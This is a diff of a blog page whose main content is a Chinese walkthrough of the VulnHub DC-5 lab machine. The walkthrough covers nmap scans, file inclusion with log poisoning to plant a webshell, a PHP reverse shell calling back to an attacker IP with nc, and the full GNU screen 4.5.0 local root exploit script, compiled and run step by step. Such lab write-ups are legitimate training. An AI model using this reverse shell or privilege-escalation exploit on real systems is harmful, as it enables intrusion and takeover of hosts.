@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="分类: 博客, HTML,CSS,JavaScript,php,python,linux,mysql等">
+    <meta name="keywords" content="DC5-靶机, HTML,CSS,JavaScript,php,python,linux,mysql等">
     <meta name="description" content="专注web，分享生活，分享知识">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>分类: 博客 | Script kiddie&#39;s life</title>
+    <title>DC5-靶机 | Script kiddie&#39;s life</title>
     <link rel="icon" type="image/jpeg" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/awesome/css/all.css">
@@ -688,202 +688,741 @@
 
 </header>
 
-    <div class="bg-cover pd-header about-cover">
-    <div class="container">
-    <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                
-                学无止境
-                
-            </div>
+    
 
-            <div class="description center-align">
-                
-                专注web，分享生活，分享知识
-                
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://s3.ax1x.com/2020/11/13/DpoxvF.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">DC5-靶机</h1>
+                </div>
             </div>
         </div>
     </div>
 </div>
 
 
-<script>
-    // 每天切换 banner 图.  Switch banner image every day.
-    $('.bg-cover').css('background-image', 'url(https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/banner/' + new Date().getDay() + '.jpg)');
-</script>
 
 
-    </div>
-</div>
-
-<main class="content">
+<main class="post-container content">
 
     
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
 
-<div id="category-cloud" class="container chip-container">
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
     <div class="card">
-        <div class="card-content">
-            <div class="tag-title center-align">
-                <i class="fas fa-bookmark"></i>&nbsp;&nbsp;文章分类
-            </div>
-            <div class="tag-chips">
-                
-                
-                
-                <a href="/categories/CTF/" title="CTF: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #F9EBEA;">CTF
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透: 2">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #F5EEF8;">内网渗透
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/web%E5%AE%89%E5%85%A8/" title="web安全: 15">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #D5F5E3;">web安全
-                        <span class="tag-length">15</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/python/" title="python: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #E8F8F5;">python
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/qq%E6%9C%BA%E5%99%A8%E4%BA%BA/" title="qq机器人: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #FEF9E7;">qq机器人
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/web%E5%AE%89%E5%85%A8/CTF/" title="CTF: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #F8F9F9;">CTF
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E5%8D%9A%E5%AE%A2/" title="博客: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-active "
-                            style="background-color: #82E0AA;">博客
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/" title="无线安全: 2">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #D7BDE2;">无线安全
-                        <span class="tag-length">2</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E5%B8%B8/" title="个人日常: 1">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #A3E4D7;">个人日常
-                        <span class="tag-length">1</span>
-                    </span>
-                </a>
-                
-                
-                <a href="/categories/web%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透: 5">
-                    <span class="chip center-align waves-effect waves-light
-                             chip-default "
-                            style="background-color: #85C1E9;">内网渗透
-                        <span class="tag-length">5</span>
-                    </span>
-                </a>
-                
-                
-            </div>
-        </div>
-    </div>
-</div>
-
-    
-
-    <article id="articles" class="container articles">
-        <div class="row tags-posts">
-            
-            <div class="article tag-post col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/posts/2f31.html">
-                        <div class="card-image tag-image">
-                            
-                            
-                            <img src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/medias/featureimages/18.jpg" class="responsive-img" alt="两种搭建个人博客方法">
-                            
-                            <span class="card-title">两种搭建个人博客方法</span>
-                        </div>
-                    </a>
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                前言:整了一个阿里云的服务器(不过没用上)，想着搭一个博客，记录自己菜鸡的日常，中间走了很多弯路，浪费了不少时间，下面是我总结的两种搭建博客的快捷方法，希望能帮到你方法一:个人服务器+宝塔+wordpress
-方法一:优势
-可拓展性强，可以
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-24
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E5%8D%9A%E5%AE%A2/" class="post-category">
-                                    博客
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
                     
-                    <div class="card-action article-tags">
+                    <div class="article-tag">
                         
-                        <a href="/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%90%AD%E5%BB%BA/">
-                            <span class="chip bg-color">个人博客的搭建</span>
-                        </a>
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">靶场</span>
+                            </a>
+                        
+                            <a href="/tags/DC/">
+                                <span class="chip bg-color">DC</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                web安全
+                            </a>
+                        
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                内网渗透
+                            </a>
                         
                     </div>
                     
                 </div>
             </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-11-12
+                </div>
+                
+
+                
+
+                
+
+                
+
+                 <span id="busuanzi_container_site_pv" style='display:none'></span> <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp; <span id="busuanzi_value_page_pv" ></span> 
+
+            </div>
+
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="基本环境的搭建"><a href="#基本环境的搭建" class="headerlink" title="基本环境的搭建"></a>基本环境的搭建</h2><p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-5.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-5.zip</a></p>
+<h2 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h2><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.149
+Host is up (0.00027s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    nginx 1.6.2
+|_http-server-header: nginx/1.6.2
+|_http-title: Welcome
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          37412/udp   status
+|   100024  1          49448/tcp6  status
+|   100024  1          49885/udp6  status
+|_  100024  1          56530/tcp   status
+MAC Address: 00:0C:29:1A:8C:74 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.27 ms 192.168.124.149
+
+Nmap scan report for 192.168.124.254</code></pre><p>发现开了80,111端口，操作系统是linux，nginx 1.6.2<br>对端口进一步探测</p>
+<pre><code>nmap -sS 192.168.124.149 -p 1-65535</code></pre><pre><code>Nmap scan report for 192.168.124.149
+Host is up (0.00089s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+56530/tcp open  unknown
+MAC Address: 00:0C:29:1A:8C:74 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.46 seconds</code></pre><p>开了56530端口<br>进入80端口查看<br><img src="/images/pasted-199.png" alt="upload successful"></p>
+<h2 id="发现一个留言功能"><a href="#发现一个留言功能" class="headerlink" title="发现一个留言功能"></a>发现一个留言功能</h2><p>尝试了xss发现并没有<br>扫描一下目录，发现特别的footer.php<br><img src="/images/pasted-200.png" alt="upload successful"><br>访问发现日期总在变<br><img src="/images/pasted-201.png" alt="upload successful"><br>发现留言的地方的日期也总在变<br><img src="/images/pasted-202.png" alt="upload successful"><br>然后thankyou.php应该是包含了footer.php页面<br>尝试文件包含读取thankyou.php文件和其他文件，发现能够成功读取</p>
+<p><img src="/images/pasted-204.png" alt="upload successful"><br><img src="/images/pasted-203.png" alt="upload successful"><br>尝试写入文件进行文件包含，能写入的文件像中间件日志文件，ssh登录的日志文件，临时文件等等<br>参考之前的文件包含<a href="https://lnng.top/posts/6b68.html">https://lnng.top/posts/6b68.html</a><br>这个还是尝试包含中间件的日志文件吧，因为ssh的登录端口不知，且其他的方法不好利用<br>随便访问一个木马<br><img src="/images/pasted-205.png" alt="upload successful"><br>蚁剑连接发现连接成功<br><img src="/images/pasted-206.png" alt="upload successful"></p>
+<h2 id="反弹交互shell"><a href="#反弹交互shell" class="headerlink" title="反弹交互shell"></a>反弹交互shell</h2><p>在/var/tmp/下新建phpshell文件，写入</p>
+<pre><code>&lt;?php
+system(&quot;nc 192.168.124.139 4444 -e /bin/sh&quot;);
+?&gt;</code></pre><p>kali端</p>
+<pre><code>nc -l -p 4444</code></pre><p>反弹shell</p>
+<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p><img src="/images/pasted-207.png" alt="upload successful"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试suid提权</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="/images/pasted-208.png" alt="upload successful"><br>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。<br>GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<br>搜索漏洞</p>
+<pre><code>searchsploit screen 4.5.0</code></pre><p>发现两个可利用的漏洞<br><img src="/images/pasted-209.png" alt="upload successful"><br>使用第一个<br>先将41154.sh复制到桌面</p>
+<pre><code>cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh
+
+cat 41154.sh</code></pre><pre><code>#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017) 
+echo &quot;~ gnu/screenroot ~&quot;
+echo &quot;[+] First, we create our shell and library...&quot;
+cat &lt;&lt; EOF &gt; /tmp/libhax.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown(&quot;/tmp/rootshell&quot;, 0, 0);
+    chmod(&quot;/tmp/rootshell&quot;, 04755);
+    unlink(&quot;/etc/ld.so.preload&quot;);
+    printf(&quot;[+] done!\n&quot;);
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat &lt;&lt; EOF &gt; /tmp/rootshell.c
+#include &lt;stdio.h&gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;/bin/sh&quot;, NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+rm -f /tmp/rootshell.c
+echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
+echo &quot;[+] Triggering...&quot;
+screen -ls # screen itself is setuid, so... </code></pre><p>这里告诉了我们使用方法<br>先将第一部分写入libhax.c文件中</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown(&quot;/tmp/rootshell&quot;, 0, 0);
+    chmod(&quot;/tmp/rootshell&quot;, 04755);
+    unlink(&quot;/etc/ld.so.preload&quot;);
+    printf(&quot;[+] done!\n&quot;);
+}</code></pre><p>然后编译</p>
+<pre><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p><img src="/images/pasted-210.png" alt="upload successful"><br>将中间的代码存入rootshell.c中</p>
+<pre><code>#include &lt;stdio.h&gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;/bin/sh&quot;, NULL, NULL);
+}</code></pre><p>然后编译</p>
+<pre><code>gcc -o rootshell rootshell.c</code></pre><p><img src="/images/pasted-211.png" alt="upload successful"><br>将剩余代码保存到dc5.sh</p>
+<pre><code>echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed
+echo &quot;[+] Triggering...&quot;
+screen -ls # screen itself is setuid, so...
+/tmp/rootshell</code></pre><p>并输入:</p>
+<pre><code>set ff=unix</code></pre><p><img src="/images/pasted-212.png" alt="upload successful"><br>将三个文件上传到/tmp文件中<br>然后修改dc5.sh的权限</p>
+<pre><code>chmod 777 dc5.sh</code></pre><p>然后执行</p>
+<pre><code>./dc5.sh</code></pre><p><img src="/images/pasted-213.png" alt="upload successful"><br>读取flag<br><img src="/images/pasted-214.png" alt="upload successful"></p>
+<pre><code>cat thisistheflag.txt                                                                                                             
+
+
+888b    888 d8b                                                      888      888 888 888                                         
+8888b   888 Y8P                                                      888      888 888 888                                         
+88888b  888                                                          888      888 888 888                                         
+888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888                                         
+888 Y88b888 888 d88P&quot;   d8P  Y8b      888  888  888 d88&quot;&quot;88b 888P&quot;   888 .88P 888 888 888                                         
+888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P                                         
+888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 &quot;88b  &quot;   &quot;   &quot;                                          
+888    Y888 888  &quot;Y8888P &quot;Y8888        &quot;Y8888888P&quot;   &quot;Y88P&quot;  888     888  888 888 888 888                                         
+
+
+
+
+Once again, a big thanks to all those who do these little challenges,
+and especially all those who give me feedback - again, it&#39;s all greatly
+appreciated.  :-)
+
+I also want to send a big thanks to all those who find the vulnerabilities
+and create the exploits that make these challenges possible.</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.jianshu.com/p/8f6e1e4d44b9" target="_blank" rel="noopener">https://www.jianshu.com/p/8f6e1e4d44b9</a><br><a href="https://www.anquanke.com/post/id/178958" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178958</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lnng.top" rel="external nofollow noreferrer">Lmg</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lnng.top/posts/328c.html">https://lnng.top/posts/328c.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://lnng.top" target="_blank">Lmg</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">靶场</span>
+                                </a>
+                            
+                                <a href="/tags/DC/">
+                                    <span class="chip bg-color">DC</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
             
         </div>
-    </article>
-</main>
+    </div>
 
+    
+
+    
+
+    
+
+    
+    <div class="livere-card card" data-aos="fade-up">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" class="card-content" data-id="city" data-uid="MTAyMC80OTIwMS8yNTY5NQ==">
+        <script type="text/javascript">
+            (function (d, s) {
+                let j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') {
+                    return;
+                }
+
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</div>
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/328c.html">
+                    <div class="card-image">
+                        
+                        <img src="https://s3.ax1x.com/2020/11/13/DpoxvF.png" class="responsive-img" alt="DC5-靶机">
+                        
+                        <span class="card-title">DC5-靶机</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            基本环境的搭建靶机下载地址：https://download.vulnhub.com/dc/DC-5.zip
+基本信息收集nmap -sS -A 192.168.124.0/24Nmap scan report for 192.168.12
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
+                    </a>
+                    
+                    <a href="/tags/DC/">
+                        <span class="chip bg-color">DC</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/fe4d.html">
+                    <div class="card-image">
+                        
+                        <img src="https://s1.ax1x.com/2020/11/11/BvEwjA.png" class="responsive-img" alt="DC4-靶机">
+                        
+                        <span class="card-title">DC4-靶机</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            靶场的搭建靶场下载地址:https://download.vulnhub.com/dc/DC-4.zip
+基本信息收集nmap扫描网段
+nmap -sS -A 192.168.124.0/24Nmap scan report for 192
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-09
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">靶场</span>
+                    </a>
+                    
+                    <a href="/tags/DC/">
+                        <span class="chip bg-color">DC</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Script kiddie&#39;s life<br />'
+            + '文章作者: Lmg<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
